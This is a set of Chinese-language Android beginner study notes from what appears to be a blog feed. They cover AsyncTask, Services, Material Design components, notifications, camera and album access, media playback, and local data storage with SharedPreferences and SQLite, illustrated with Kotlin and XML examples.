doInBackground(Params…)这个方法中的所有代码都会在子线程中运行，我们应该在这里去处理所有的耗时任务。任务一旦完成，就可以通过return语句将任务的执行结果返回，如果AsyncTask的第三个泛型参数指定的是Unit，就可以不返回任务执行结果。注意，在这个方法中是不可以进行UI操作的，如果需要更新UI元素，比如说反馈当前任务的执行进度，可以调用publishProgress (Progress…)方法来完成。

onProgressUpdate(Progress…)当在后台任务中调用了publishProgress(Progress…)方法后，onProgressUpdate (Progress…)方法就会很快被调用，该方法中携带的参数就是在后台任务中传递过来的。在这个方法中可以对UI进行操作，利用参数中的数值就可以对界面元素进行相应的更新。

onPostExecute(Result)当后台任务执行完毕并通过return语句进行返回时，这个方法就很快会被调用。返回的数据会作为参数传递到此方法中，可以利用返回的数据进行一些UI操作，比如说提醒任务执行的结果，以及关闭进度条对话框等。


简单来说，使用AsyncTask的诀窍就是，在doInBackground()方法中执行具体的耗时任务，在onProgressUpdate()方法中进行UI操作，在onPostExecute()方法中执行一些任务的收尾工作。
如果需要启动某个任务，就执行AsyncTask的execute()方法并传入任意数量的参数，这些参数将会传递到DownloadTask的doInBackground()方法当中。
Service的基本用法创建一个service，只需要这样即可

service常用的重写方法：onCreate()方法会在Service创建的时候调用，onStartCommand()方法会在每次Service启动的时候调用onDestroy()方法会在Service销毁的时候调用。
启动和停止service都是通过intent来实现的。
Activity与Service进行通信需要使用到service中的onBind()方法。在service中定义一个bind类继承自Binder：
//声明这个bind类并构建出来 private val mBinder = DownloadBinder()    class DownloadBinder : Binder() &#123;        fun startDownload() &#123;            Log.d(&quot;MyService&quot;, &quot;startDownload executed&quot;)        &#125;        fun getProgress(): Int &#123;            Log.d(&quot;MyService&quot;, &quot;getProgress executed&quot;)            return 0        &#125;    &#125;	//在与activity绑定时，将会返回这个创建的binder类    override fun onBind(intent: Intent?): IBinder &#123;        return mBinder    &#125;

在activity中提前预埋好用来存储的bind：
//用来存储从service中获取的binder类。private lateinit var downloadBinder: MyService.DownloadBinder//继承ServiceConnection接口，当连接建立时，将会调用onServiceConnected方法，连接关闭时将会调用onServiceDisconnected方法。    private var connect = object :ServiceConnection&#123;        override fun onServiceConnected(p0: ComponentName?, p1: IBinder?) &#123;           downloadBinder = p1 as MyService.DownloadBinder            downloadBinder.startDownload()            downloadBinder.getProgress()        &#125;        override fun onServiceDisconnected(p0: ComponentName?) &#123;            TODO(&quot;Not yet implemented&quot;)        &#125;    &#125;

与按钮绑定相关连接事件：
binding.bindServiceBtn.setOnClickListener &#123;val intent = Intent(this, MyService::class.java)bindService(intent,connect,Context.BIND_AUTO_CREATE)//绑定service&#125;binding.unbindServiceBtn.setOnClickListener &#123;unbindService(connect) // 解绑Service&#125;

bindService接受三个参数，第一个就是intent，第二个放入连接时对象，当连接成功时就会调用其中的方法。，第三个参数则是一个标志位，这里传入BIND_AUTO_CREATE表示在Activity和Service进行绑定后自动创建Service。这会使得MyService中的onCreate()方法得到执行，但onStartCommand()方法不会执行。
这样子后，获取到activity就可以通过已经存储好的downloadBinder命令service完成任何需要完成的事。注意的是，不同的activity都可以获得这个binder对象。
Service的生命周期
service只有在第一次被启动时，才会执行onCreate方法，然后执行onStartCommand()。其他每次执行都只会调用onStartCommand()方法。所以service只会有一个实例，所以只要你调用了stopself()或者stopService()都会直接停止。

bindService()方法则会回调onBind()方法，如果service没有建立，就会调用一次onCreate()方法。从onBind()获取对象后就可以相互通信了。

当调用了startService()方法后，再去调用stopService()方法。这时Service中的onDestroy()方法就会执行，表示Service已经销毁了。类似地，当调用了bindService()方法后，再去调用unbindService()方法，onDestroy()方法也会执行，这两种情况都很好理解。但是需要注意，我们是完全有可能对一个Service既调用了startService()方法，又调用了bindService()方法的，在这种情况下该如何让Service销毁呢？根据Android系统的机制，一个Service只要被启动或者被绑定了之后，就会处于运行状态，必须要让以上两种条件同时不满足，Service才能被销毁。所以，这种情况下要同时调用stopService()和unbindService()方法，onDestroy()方法才会执行。


前台Service从Android 8.0系统开始，只有当应用保持在前台可见状态的情况下，Service才能保证稳定运行，一旦应用进入后台之后，Service随时都有可能被系统回收。前台Service和普通Service最大的区别就在于，它一直会有一个正在运行的图标在系统的状态栏显示
构建前台service：样例：
override fun onCreate() &#123;    super.onCreate()    Log.d(&quot;MyService&quot;, &quot;onCreate executed&quot;)    val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager    if(Build.VERSION.SDK_INT&gt;=Build.VERSION_CODES.O)&#123;        val channel = NotificationChannel(&quot;my_channel&quot;, &quot;前台service通知&quot;, NotificationManager.IMPORTANCE_DEFAULT)        manager.createNotificationChannel(channel)    &#125;    val intent = Intent(this,MainActivity::class.java)    val pi = PendingIntent.getActivities(this,0, arrayOf(intent), PendingIntent.FLAG_IMMUTABLE)    val notification = NotificationCompat.Builder(this,&quot;my_channel&quot;)        .setContentTitle(&quot;前台service通知&quot;)        .setContentText(&quot;炉知笔记&quot;)        .setSmallIcon(R.mipmap.ic_launcher)        .setContentIntent(pi)        .build()    startForeground(1,notification)&#125;
它与通知很像，但不同的是，它不是通过manager.notify()来启动。，而是调用了startForeground()方法第一个参数是通知的id，类似于notify()方法的第一个参数；第二个参数则是构建的Notification对象。调用startForeground()方法后就会让MyService变成一个前台Service，并在系统状态栏显示出来。
而且前台service需要获取权限认可：
IntentService它与service大差不差，属于service的一个子类。需要实现一个抽象方法onHandleIntent(),它会默认在子线程中运行。这个抽象方法与startCommand一样，每次启动时都会调用
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Android入门(Material Design)</title>
    <url>/posts/2026a548/</url>
    <content><![CDATA[一套全新的界面设计语言——Material DesignToolbor不仅仅继承了ActionBar的所有功能，而且灵活性很高，可以配合其他控件完成一些Material Design的效果.

任何一个新建的项目都会默认支持ActionBar，他被在AndroidManifest中声明，也就是被定义在了android:theme=&quot;@style/AppTheme&quot;&gt;主题中。他的默认配置如下：

&lt;resources&gt; &lt;!-- Base application theme. --&gt; &lt;style name=&quot;AppTheme&quot; parent=&quot;Theme.AppCompat.Light.DarkActionBar&quot;&gt; &lt;!-- Customize your theme here. --&gt; &lt;item name=&quot;colorPrimary&quot;&gt;@color/colorPrimary&lt;/item&gt; &lt;item name=&quot;colorPrimaryDark&quot;&gt;@color/colorPrimaryDark&lt;/item&gt; &lt;item name=&quot;colorAccent&quot;&gt;@color/colorAccent&lt;/item&gt; &lt;/style&gt;&lt;/resources&gt;
其中的color是配置颜色的，这有一张颜色配置的图![](https://image.zfxt.top/hexo-blog/Android入门(Material Design)-2023-08-04-08-42.png)
设置Toolbar&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;FrameLayout		xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;		xmlns:tools=&quot;http://schemas.android.com/tools&quot;		xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot;		android:layout_width=&quot;match_parent&quot;		android:layout_height=&quot;match_parent&quot;		tools:context=&quot;.MainActivity&quot;&gt;	&lt;androidx.appcompat.widget.Toolbar			android:id=&quot;@+id/toolbar&quot;			android:layout_width=&quot;match_parent&quot;			android:layout_height=&quot;?attr/actionBarSize&quot;			android:background=&quot;@color/design_default_color_primary&quot;			android:theme=&quot;@style/ThemeOverlay.AppCompat.Dark.ActionBar&quot;			app:popupTheme=&quot;@style/ThemeOverlay.AppCompat.Light&quot;/&gt;&lt;/FrameLayout&gt;
理解一下上述代码的内容。使用了xmlns:app指定了一个新的命名空间，我们就可以使用app:attribute这样的写法了。但是为什么要加入xmlns:app呢？因为很多Material属性是老系统不存在的，为了能够兼容老系统。就不能使用android:attribute这样的写法了，而是应该使用app:attribute。Toolbar控件，这个控件是由appcompat库提供的。他的theme是为了单独设置toolbar的主题色，浅色或者深色。这里可以设置深色主题，但是如果有菜单按钮，那么弹出的菜单也变成深色，就会变得很难看。所以这里app:popupTheme=&quot;@style/ThemeOverlay.AppCompat.Light&quot;/&gt;就是设置弹出框为浅色主题
更多功能
添加按钮 右击res目录→New→Directory，创建一个menu文件夹。然后右击menu文件夹→New→Menu resource file，创建一个toolbar.xml文件，并编写如下代码：&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;menu xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;	  xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot;&gt;	&lt;item			android:id=&quot;@+id/backup&quot;			android:icon=&quot;@drawable/loibus10&quot;			android:title=&quot;Backup&quot;			app:showAsAction=&quot;always&quot;/&gt;	&lt;item			android:id=&quot;@+id/delete&quot;			android:icon=&quot;@drawable/loibus11&quot;			android:title=&quot;Delete&quot;			app:showAsAction=&quot;ifRoom&quot;/&gt;	&lt;item			android:id=&quot;@+id/settings&quot;			android:icon=&quot;@drawable/loibus12&quot;			android:title=&quot;Settings&quot;			app:showAsAction=&quot;never&quot;/&gt;&lt;/menu&gt;
使用app:showAsAction来指定按钮的显示位置，这里之所以再次使用了app命名空间，同样是为了能够兼容低版本的系统。showAsAction主要有以下几种值可选：always表示永远显示在Toolbar中，如果屏幕空间不够则不显示；ifRoom表示屏幕空间足够的情况下显示在Toolbar中，不够的话就显示在菜单当中；never则表示永远显示在菜单当中。注意，Toolbar中的action按钮只会显示图标，菜单中的action按钮只会显示文字然后再activity中配置按钮的逻辑override fun onCreateOptionsMenu(menu: Menu?): Boolean &#123;        menuInflater.inflate(R.menu.toolbar, menu)        return true    &#125;    override fun onOptionsItemSelected(item: MenuItem): Boolean &#123;        when (item.itemId) &#123;            R.id.backup -&gt; Toast.makeText(                this, &quot;You clicked Backup&quot;, Toast.LENGTH_SHORT            ).show()            R.id.delete -&gt; Toast.makeText(this, &quot;You clicked Delete&quot;, Toast.LENGTH_SHORT).show()            R.id.settings -&gt; Toast.makeText(this, &quot;You clicked Settings&quot;, Toast.LENGTH_SHORT).show()        &#125;        return true    &#125;
先注册，再配置逻辑功能。

滑动菜单Drawerlayout首先，他是一个布局，在布局中允许放入两个直接子控件：第一个是主屏幕显示的内容。第二个是滑动菜单中显式的内容。但是关于第二个子控件有一点需要注意，layout_gravity这个属性是必须指定的，因为我们需要告诉DrawerLayout滑动菜单是在屏幕的左边还是右边，指定left表示滑动菜单在左边，指定right表示滑动菜单在右边。指定了start，表示会根据系统语言进行判断，如果系统语言是从左往右的，比如英语、汉语，滑动菜单就在左边，如果系统语言是从右往左的，比如阿拉伯语，滑动菜单就在右边。
setSupportActionBar(binding.toolbar)        supportActionBar?.let &#123;            it.setDisplayHomeAsUpEnabled(true)            it.setHomeAsUpIndicator(R.drawable.loibus16)   &#125;
这一段代码的作用是在ActionBar不为空的情况下调用setDisplayHomeAsUpEnabled()方法让导航按钮显示出来，调用setHomeAsUpIndicator()方法来设置一个导航按钮图标。实际上，ToolBar最左侧的按钮被称为Home按钮，默认为一个返回的箭头，作用是返回上一个activity。而且这给按钮的id永远是android.R.id.home，这是系统内定的，我们在为其设置相应的逻辑android.R.id.home-&gt;binding.drawerLayout.openDrawer(GravityCompat.START)。
NavigationView可以在滑动菜单页面定制任意的布局。他需要再导入两个包，
//Material库implementation(&quot;com.google.android.material:material:1.9.0&quot;)//开源项目CircleImageView，它可以用来轻松实现图片圆形化的功能implementation(&quot;de.hdodenhof:circleimageview:3.0.1&quot;)

需要注意的是，当你引入了Material库之后，还需要将res&#x2F;values&#x2F;styles.xml文件中AppTheme的parent主题改成Theme.MaterialComponents.Light.NoActionBar，否则在使用接下来的一些控件时可能会遇到崩溃问题。

使用NavigationView，要准备好menu和headerLayout。前者是用来再NavigationView显示菜单项的，后者是用来在NavigationView定义头部的
&lt;com.google.android.material.navigation.NavigationView			android:id=&quot;@+id/navView&quot;			android:layout_width=&quot;match_parent&quot;			android:layout_height=&quot;match_parent&quot;			android:layout_gravity=&quot;start&quot;			app:menu=&quot;@menu/nav_menu&quot;			app:headerLayout=&quot;@layout/nav_header&quot;/&gt;
这是为Drawerlayout配置NavigationView，其中声明好了menu和headerLayout。配置menu时，需要注意的是
&lt;group android:checkableBehavior=&quot;single&quot;&gt;...&lt;/group&gt;
这里的配置表明只能单选。最后在activity中配置
binding.navView.setCheckedItem(R.id.navCall)        binding.navView.setNavigationItemSelectedListener &#123;            binding.drawerLayout.closeDrawers()            true        &#125;
这里先设置了默认选择项，然后配置他们所有选项的逻辑。这里所有的逻辑都是关闭滑动菜单
还有很多特性，不一一列举，看过一遍就不再记笔记了。这些都可以网上轻松找到代码
悬浮按钮（FloatingActionButton）

可交互提示Snackbar

CoordinatorLayout（加强版的FrameLayout）


CoordinatorLayout可以监听其所有子控件的各种事件，并自动帮助我们做出最为合理的响应。举个简单的例子，刚才弹出的Snackbar提示将悬浮按钮遮挡住了，而如果我们能让CoordinatorLayout监听到Snackbar的弹出事件，那么它会自动将内部的FloatingActionButton向上偏移，从而确保不会被Snackbar遮挡。

glideimplementation &#39;com.github.bumptech.glide:glide:4.9.0&#39;Glide是一个超级强大的开源图片加载库，它不仅可以用于加载本地图片，还可以加载网络图片、GIF图片甚至是本地视频。而且Glide的用法很简单。首先调用Glide.with()方法并传入一个Context、Activity或Fragment参数，然后调用load()方法加载图片，可以是一个URL地址，也可以是一个本地路径，或者是一个资源id，最后调用into()方法将图片设置到具体某一个ImageView中就可以了。

卡片式布局（MaterialCardView）

ImageView中我们使用了一个scaleType属性，这个属性可以指定图片的缩放模式。

为了让所有的图片都能填充满整个ImageView，这里使用了centerCrop模式，它可以让图片保持原有比例填充满ImageView，并将超出屏幕的部分裁剪掉

AppBarLayout,与app:layout_behavior指定布局appbar_scrolling_view_behavior。相互配合。app:layout_scrollFlags在Toolbar中添加了一个app:layout_scrollFlags属性，并将这个属性的值指定成了scroll|enterAlways|snap。其中，scroll表示当RecyclerView向上滚动的时候，Toolbar会跟着一起向上滚动并实现隐藏；enterAlways表示当RecyclerView向下滚动的时候，Toolbar会跟着一起向下滚动并重新显示；snap表示当Toolbar还没有完全隐藏或显示的时候，会根据当前滚动的距离，自动选择是隐藏还是显示。

下拉刷新，首先需要导入相关的类implementation(&quot;androidx.swiperefreshlayout:swiperefreshlayout:1.0.0&quot;)通过这个类。。只要在需要设置刷新的模块上套上一层swiperefreshlayout就可以实现下拉功能。然后我们需要在activity中设置他的逻辑功能。

可折叠式标题栏（CollapsingToolbarLayout）


]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Android入门(使用多媒体)</title>
    <url>/posts/38117f08/</url>
    <content><![CDATA[使用通知功能通知渠道：自Android8.0后引入的新概念。每个应用程序可以自由的创建当前应用应该拥有哪些通知渠道。而这些通知渠道的控制权掌握在用户手中。用户可以选择是否响铃、是否振动或者是否要关闭这个渠道的通知。对于应用而言，，通知渠道一旦创建就不可修改。所以一定要设计好有哪些渠道需要设计。
通知渠道的基本使用
首先需要一个NotificationManager对通知进行管理。可以通过调用Context的getSystemService()方法获取。这个方法接收一个参数用于确定获取系统的那个服务，如：val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager。Context.NOTIFICATION_SERVICE就是通知服务

构建通知渠道：使用NotificationChannel类构建一个通知渠道，并调用NotificationManager的createNotificationChannel()方法完成创建。由于这些类是在Android8.0后添加的，因此使用前要先判断版本。
if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.O) &#123; val channel = NotificationChannel(channelId, channelName, importance) manager.createNotificationChannel(channel)&#125;
创建一个通知渠道至少需要渠道ID、渠道名称以及重要等级这3个参数通知的重要等级主要有IMPORTANCE_HIGH、IMPORTANCE_DEFAULT、IMPORTANCE_LOW、IMPORTANCE_MIN这几种

通知一般都在后台的service去实现，前端的activity，或者broadcast使用的较少。


通知的默认使用方法就版本的不同，8.0前和8.0后使用的方法不一样。所以AndroidX库中提供了兼容的API。AndroidX库中提供了一个NotificationCompat类，使用这个类的构造器创建Notification对象，就可以保证我们可以在所有的android上正常工作了。

使用构造器构造Notification对象,val notification = NotificationCompat.Builder(context, channelId).build()，它接收两个参数，一个context，一个渠道id。需要和我们在创建通知渠道时指定的渠道ID相匹配才行。
上一步的通知只是一个空通知，什么都没有，而我们可以通过以下方法添加内容：


setContentTitle()方法用于指定通知的标题内容，下拉系统状态栏就可以看到这部分内容。
setContentText()方法用于指定通知的正文内容，同样下拉系统状态栏就可以看到这部分内容。
setSmallIcon()方法用于设置通知的小图标，注意，只能使用纯alpha图层的图片进行设置，小图标会显示在系统状态栏上。
setLargeIcon()方法用于设置通知的大图标，当下拉系统状态栏时，就可以看到设置的大图标了。


就以上方法完成后，可以通过调用NotificationManager的notify()方法将通知显示出来了。notify()方法接收两个参数：第一个参数是id，要保证为每个通知指定的id都是不同的；第二个参数则是Notification对象，这里直接将我们刚刚创建好的Notification对象传入即可。

这是一段样例代码：
class MainActivity : AppCompatActivity() &#123;    private lateinit var binding: ActivityMainBinding    override fun onCreate(savedInstanceState: Bundle?) &#123;        super.onCreate(savedInstanceState)        binding = ActivityMainBinding.inflate(layoutInflater)        setContentView(binding.root)        val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager        if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.O) &#123;            val channel = NotificationChannel(&quot;normal&quot;, &quot;normal&quot;, NotificationManager.IMPORTANCE_DEFAULT)            manager.createNotificationChannel(channel)        &#125;        binding.sendNotice.setOnClickListener &#123;            val notice = NotificationCompat.Builder(this, &quot;normal&quot;)                .setContentTitle(&quot;This is my title&quot;)                .setContentText(&quot;This is 贺政涛&#x27;s content&quot;)                .setSmallIcon(R.drawable.img_1)                .setLargeIcon(BitmapFactory.decodeResource(resources,R.drawable.img_1))                        .build()            manager.notify(1, notice)        &#125;    &#125;&#125;
系统会自动判断是否已经存在通知渠道，如果存在的话，它就不会再次创建了


PendingIntentpendingintent和intent很多地方都是类似的。区别在于，Intent倾向于立即执行某个动作，而PendingIntent倾向于在某个合适的时机执行某个动作，也可以把PendingIntent简单地理解为延迟执行的Intent。它可以通过几个默认的静态方法构建如：getActivity()方法、getBroadcast()方法，还是getService()方法。这些方法接受的参数都是一样的，第一个参数是context，第二个参数用不到，设为0即可。第三个参数是一个intent对象，需要自己创建。第四个参数用于确定PendingIntent的行为，有FLAG_ONE_SHOT、FLAG_NO_CREATE、FLAG_CANCEL_CURRENT和FLAG_UPDATE_CURRENT这4种值可选。然后需要连接通知的pendingintent只需要在构建时再连缀一个setcontentIntent()即可

设计再点击通知后，该通知自动消失：一种是在NotificationCompat.Builder中再连缀一个setAutoCancel()方法，一种是显式地调用NotificationManager的cancel()方法将它取消。

通知进阶
通知构造器有一个方法setStyle()。这个方法可以设置富文本。可以实现以下功能：


让通知可以放很长的文本，而不会被系统隐藏
可以再通知内容中放入图片


通知的重要程度：决定了通知是会以横幅的形式出现还是通知栏响一下

调用摄像头和相册摄像头package top.zfxt.cameraalbumtestimport android.app.Activityimport android.content.Intentimport android.graphics.Bitmapimport android.graphics.BitmapFactoryimport android.graphics.Matriximport android.media.ExifInterfaceimport android.net.Uriimport android.os.Buildimport androidx.appcompat.app.AppCompatActivityimport android.os.Bundleimport android.provider.MediaStoreimport android.provider.MediaStore.Audio.Mediaimport androidx.core.content.FileProviderimport androidx.core.graphics.rotationMatriximport top.zfxt.cameraalbumtest.databinding.ActivityMainBindingimport java.io.Fileclass MainActivity : AppCompatActivity() &#123;    lateinit var binding: ActivityMainBinding    val takePhoto = 1    lateinit var imageUri: Uri    lateinit var outputImage: File    override fun onCreate(savedInstanceState: Bundle?) &#123;        super.onCreate(savedInstanceState)         binding = ActivityMainBinding.inflate(layoutInflater)        setContentView(binding.root)        //为按钮注册点击事件        binding.takePhotoBtn.setOnClickListener &#123;            //创建File对象，用于存储拍照后的图片            /**             * [externalCacheDir] 是指手机SD卡的应用关联缓存目录             * 具体的路径是/sdcard/Android/data/&lt;package name&gt;/cache             * 因为从Android 6.0系统开始，读写SD卡             * 被列为了危险权限，如果将图片存放在SD卡的任何其他目录，             * 都要进行运行时权限处理才行，而使用应用关联目录则可以跳过这一步             * 另外，从Android 10.0系统开始，公有的SD卡目录已经不再允许被应用程序直接访问了，而是要使用作用域存储才行             */            outputImage = File(externalCacheDir, &quot;output_image.png&quot;)            if (outputImage.exists()) &#123;                outputImage.delete()            &#125;            outputImage.createNewFile()            /**             * 如果运行设备的系统版本低于Android 7.0，就调用Uri的fromFile()             * 方法将File对象转换成Uri对象             * 这个Uri对象标识着output_image.jpg这张图片的本地真实路径。             * 否则，就调用FileProvider的getUriForFile()方法将File对象转换成一个封装过的             * Uri对象。getUriForFile()方法接收3个参数：第一个参数要求传入Context对象，第二个             * 参数可以是任意唯一的字符串，第三个参数则是我们刚刚创建的File对象。之所以要进行这样             * 一层转换，是因为从Android 7.0系统开始，直接使用本地真实路径的Uri被认为是不安全的，             * 会抛出一个FileUriExposedException异常。而FileProvider则是一种特殊的             * ContentProvider，它使用了和ContentProvider类似的机制来对数据进行保护，可以选择性             * 地将封装过的Uri共享给外部，从而提高了应用的安全性。             */            imageUri = if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.N) &#123;                FileProvider.getUriForFile(this, &quot;top.zfxt.cameraalbumtest.fileprovider&quot;, outputImage)            &#125; else &#123;                Uri.fromFile(outputImage)            &#125;            //启动相机程序            //拍下的照片将会输出到output_image.jpg中            val intent = Intent(&quot;android.media.action.IMAGE_CAPTURE&quot;)            intent.putExtra(MediaStore.EXTRA_OUTPUT, imageUri)            startActivityForResult(intent, takePhoto)        &#125;    &#125;    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) &#123;        super.onActivityResult(requestCode, resultCode, data)        when(requestCode) &#123;            takePhoto-&gt;&#123;                if(resultCode== Activity.RESULT_OK)&#123;                    //将拍摄的图片显示出来                    val bitmap = BitmapFactory.decodeStream(contentResolver.openInputStream(imageUri))                    binding.imageView.setImageBitmap(rotateIfRequired(bitmap))                &#125;            &#125;        &#125;    &#125;    //用于处理图片的翻转问题    private fun rotateIfRequired(bitmap: Bitmap): Bitmap &#123;        val exif = ExifInterface(outputImage.path)        val orientation = exif.getAttributeInt(ExifInterface.TAG_ORIENTATION,            ExifInterface.ORIENTATION_NORMAL)        return when (orientation) &#123;            ExifInterface.ORIENTATION_ROTATE_90 -&gt; rotateBitmap(bitmap, 90)            ExifInterface.ORIENTATION_ROTATE_180 -&gt; rotateBitmap(bitmap, 180)            ExifInterface.ORIENTATION_ROTATE_270 -&gt; rotateBitmap(bitmap, 270)            else -&gt; bitmap        &#125;    &#125;    private fun rotateBitmap(bitmap: Bitmap, degree: Int): Bitmap &#123;        val matrix = Matrix()        matrix.postRotate(degree.toFloat())        val rotatedBitmap = Bitmap.createBitmap(bitmap, 0, 0, bitmap.width, bitmap.height,            matrix, true)        bitmap.recycle() // 将不再需要的Bitmap对象回收        return rotatedBitmap    &#125;&#125;
我们还需要在AndroidManifest.xml中声明fileProvider
&lt;provider		android:authorities=&quot;top.zfxt.cameraalbumtest.fileprovider&quot;		android:name=&quot;androidx.core.content.FileProvider&quot;		android:exported=&quot;false&quot;		android:grantUriPermissions=&quot;true&quot;&gt;	&lt;meta-data android:name=&quot;android.support.FILE_PROVIDER_PATHS&quot;			   android:resource=&quot;@xml/file_paths&quot;/&gt;&lt;/provider&gt;
 这是定义的xml路径文件  &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;paths xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;&gt; &lt;external-path name=&quot;my_images&quot; path=&quot;/&quot; /&gt;&lt;/paths&gt;
访问相册binding.fromAlbumBtn.setOnClickListener &#123;            //打开文件选择器            val intent = Intent(Intent.ACTION_OPEN_DOCUMENT)            intent.addCategory(Intent.CATEGORY_OPENABLE)            //指定只显示图片            intent.type = &quot;image/*&quot;            startActivityForResult(intent, 2)        &#125;		...		...		2 -&gt; &#123;                if (resultCode == Activity.RESULT_OK &amp;&amp; data != null) &#123;                    data.data?.let &#123;                        //将选择的图片展示出来                        val bitmap = getBitmapFromUri(it)                        binding.imageView.setImageBitmap(bitmap)                    &#125;                &#125;            &#125;		...				private fun getBitmapFromUri(uri: Uri) = contentResolver        .openFileDescriptor(uri, &quot;r&quot;)?.use &#123;            BitmapFactory.decodeFileDescriptor(it.fileDescriptor)        &#125;

播放多媒体文件mediaPlayerAndroid常用的用来处理音频文件的是MediaPlayer类。以上是一些常用的控制方法。
工作流程：

首先需要创建一个MediaPlayer对象，然后调用setDataSource()方法设置音频文件的路径。
调用prepare()方法使MediaPlayer进入准备状态
接下来调用start()方法就可以开始播放音频，调用pause()方法就会暂停播放，调用reset()方法就会停止播放。class MainActivity : AppCompatActivity() &#123;    private val mediaplayer = MediaPlayer()    private lateinit var binding: ActivityMainBinding    override fun onCreate(savedInstanceState: Bundle?) &#123;        super.onCreate(savedInstanceState)        binding = ActivityMainBinding.inflate(layoutInflater)        setContentView(binding.root)        initMediaPlayer()        binding.play.setOnClickListener &#123;            if (!mediaplayer.isPlaying) &#123;                mediaplayer.start()            &#125;        &#125;        binding.pause.setOnClickListener &#123;            if (mediaplayer.isPlaying) &#123;                mediaplayer.pause() // 暂停播放            &#125;        &#125;        binding.stop.setOnClickListener &#123;            if (mediaplayer.isPlaying) &#123;                mediaplayer.reset() // 停止播放            &#125;        &#125;    &#125;    private fun initMediaPlayer() &#123;        val assetMannager = assets        val fd = assetMannager.openFd(&quot;肉肉.mp3&quot;)        mediaplayer.setDataSource(fd.fileDescriptor, fd.startOffset, fd.length)        mediaplayer.prepare()    &#125;    override fun onDestroy() &#123;        super.onDestroy()        mediaplayer.stop()        mediaplayer.release()    &#125;&#125;

videoPlayer
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Android入门(数据持久化)</title>
    <url>/posts/e8a3427e/</url>
    <content><![CDATA[文件存储写入文件Context提供了一个openFileOutput()方法，他需要两个参数，第一个参数是文件名，不准带路径，因为所有的文件都会默认保存到/data/data/&lt;package name&gt;/files/下，第二个参数是操作模式，主要有MODE_PRIVATE和MODE_APPEND一个是覆写，一个是追加。openFileOutput()返回的是一个outputstream()
读取文件Context提供了一个openFileInput()，他只需要一个参数，就是文件名，它返回的是一个inputstream流。系统会自动到/data/data/&lt;package name&gt;/files/下寻找文件。然后你通过流的方式读取文件。

setSelection()是Edittext中，用来调节光标位置的方法。

SharedPreferences存储在SharedPreferences中，他是通过key-value的方式存储数据的。而且它存储后的内容是通过xml进行保存的。它被保存在一个固定的目录中/data/data/&lt;packagename&gt;/shared_prefs/。
存储数据
Context提供了一个getSharedPreferences()方法，通过该方法可以获取一个对象，它接收两个参数，第一个参数是文件名。第二个参数是操作模式。目前只有MODE_PRIVATE其他均已被废除。
Activity提供了一个getPreferences()方法，它只需要填如操作模式，它默认把文件名定义为activity的类名。

存储主要可以分为3步实现。

调用SharedPreferences对象的edit()方法获取一个SharedPreferences.Editor对象。
向SharedPreferences.Editor对象中添加数据，比如添加一个布尔型数据就使用putBoolean()方法，添加一个字符串则使用putString()方法，以此类推。
调用apply()方法将添加的数据提交，从而完成数据存储操作。

获取数据
调用SharedPreferences对象的edit()方法获取一个SharedPreferences.Editor对象。
调用getString()等方法来获取。他也需要两个参数，第一个参数是key键，第二个参数是，如果没读取出来，设置某个默认值。

数据库存储Android内置了SQLite数据库为我们使用。这个数据库很小巧。而且运行超快。
SQLiteOpenHelper这是android为我们提供的一种帮助类，通过这个类，可以简单的创建和使用数据库。它本身是一个抽象类，我们需要继承并实现他的两个抽象方法:onCreate(),onUpgrade()。然后这两个方法中实现创建数据库和升级数据库的逻辑。他还有两个重要的实例方法：getReadableDatabase()和getWritableDatabase()。这两个方法都可以创建或者打开一个数据库。并返回一个能对数据库进行读写的对象。这两个方法不同的是，如果数据库不可写入，如磁盘已满，那么read获得的是一个只能读的对象。而write会直接报错。SQLiteOpenHelper有两个构造方法可以重写。一般使用参数较少的这个：四个参数：context，数据库名，可以自定义的cursor，当前数据库的版本号。数据库文件创建完后会存放在/data/data/&lt;packagename&gt;/databases/目录下。
创建数据库
首先先构建好SQLiteOpenHelper，并完成onCreate和onUpgrade的重写

class MyDataBaseHelper(val context: Context, val name: String, val version: Int) :    SQLiteOpenHelper(context, name, null, version) &#123;        //sql语句    private val createBook = &quot;create table Book (&quot; +            &quot; id integer primary key autoincrement,&quot; +            &quot;author text,&quot; +            &quot;price real,&quot; +            &quot;pages integer,&quot; +            &quot;name text)&quot;        //sql语句    private val createCategory = &quot;create table Category (&quot; +            &quot;id integer primary key autoincrement,&quot; +            &quot;category_name text,&quot; +            &quot;category_code integer)&quot;    override fun onCreate(db: SQLiteDatabase) &#123;        db.execSQL(createBook)        db.execSQL(createCategory)        Toast.makeText(context, &quot;Creat Success&quot;, Toast.LENGTH_SHORT).show()    &#125;    override fun onUpgrade(db: SQLiteDatabase, oldVersion: Int, newVersion: Int) &#123;        db.execSQL(&quot;drop table if exists Book&quot;)        db.execSQL(&quot;drop table if exists Category&quot;)        onCreate(db)    &#125;&#125;
&gt; execSQL中都是填入sqluvjv


在activity中，构建一个MyDataBaseHelperval dbHelper = MyDataBaseHelper(this,&quot;BookStore.db&quot;,1)
与某个按钮绑定，创建数据库createDatabase.setOnClickListener &#123;    dbHelper.writableDatabase&#125;
然后就完成了创建过程这里要注意的点：(1):writableDatabase该方法会先判断是否存在数据库，如果已经存在则只打开，否则将会创建并调用onCreat()方法。然后完成数据库的创建。(2):但是如果数据库已经存在了，你需要再添加新表或者对数据库结构的操作，就必须删除数据库重新调用onCreate方法。或者将val dbHelper = MyDataBaseHelper(this,&quot;BookStore.db&quot;,1)
的版本号改成比1大的任意自然数。他就会调用onUpgrade()方法。这样子就可以实现数据库的升级。

